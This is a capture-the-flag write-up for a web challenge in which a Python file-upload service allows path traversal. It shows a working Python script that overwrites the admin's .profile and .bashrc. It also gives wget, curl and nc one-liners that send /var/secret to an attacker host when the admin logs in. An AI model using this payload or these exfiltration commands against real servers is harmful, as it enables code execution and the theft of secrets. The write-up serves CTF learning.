# Web 01 (web, 100p, 46 solved)

```
manhndd is running a service file upload at web01.grandprix.whitehatvn.com, it is restored every 2 minutes. 
Every 1 minute after service starts, he ssh into server to check /var/secret. 
Can you get it?

Note: Player shouldn't Dos web01, you can get source code and run in local
```

In the task we get access to a python-based file upload service.
We can download uploaded files, including the [server file itself](SimpleHTTPServerWithUpload.py).

If we diff this file with the original, we can notice there is only a single change -> the special case when file we want to upload already exists.
It seems with the script running on the server we could overwrite files because no such check exists!

Let's look at how the files are uploaded:

```python
fn = re.findall(r'Content-Disposition.*name="file"; filename="(.*)"', line)
if not fn:
    return (False, "Can't find out file name...")
path = self.translate_path(self.path)
fn = os.path.join(path, fn[0])
if "index" in fn.lower():
    return (False, "Can't create file to write, do you have permission to write?")
line = self.rfile.readline()
remainbytes -= len(line)
line = self.rfile.readline()
remainbytes -= len(line)
try:
    out = open(fn, 'wb')
except IOError:
    return (False, "Can't create file to write, do you have permission to write?")
```

Interesting part is that the filename taken for the output file is taken from the POST request almost directly.
This means if we send for example path `/etc/passwd` if would actually try to overwrite this file.

This would not be very useful, however we know that `manhndd (...) ssh into server to check /var/secret`.
We can, therefore, overwrite contents of `.bashrc` or `.profile`, and they would get executed once admin logs in to the machine.

We know the username, so we can guess the path is `/home/manhndd`.
We can easily verify this, since the uploader returns an error if we can't write the file.

The final payload is:

```python
from time import sleep

import requests


def main():
    while True:
        url = 'http://web01.grandprix.whitehatvn.com/'
        files = {'file': ('/home/manhndd/.profile', open('payload.txt', 'rb'))}
        r = requests.post(url, files=files, headers={"referer": "dupa.pl"})
        print(r.text)
        files = {'file': ('/home/manhndd/.bashrc', open('payload.txt', 'rb'))}
        r = requests.post(url, files=files, headers={"referer": "dupa.pl"})
        print(r.text)
        sleep(1)
main()
```

With payload set to `curl`/`wget`/`nc` sending the flag to us:

```
wget --post-file=/var/secret http://our.host;
curl -F "file=@/var/secret" http://our.host;
cat /var/secret | nc our.host port;
```

Keep in mind, the file gets overwritten, so other teams can overwrite our payload.
From what we noticed, there were teams who purpously were doing that, to prevent others from getting the flag.

It took a while for us to get lucky with race condition, but finally we got `g1ftfr0mNQ`
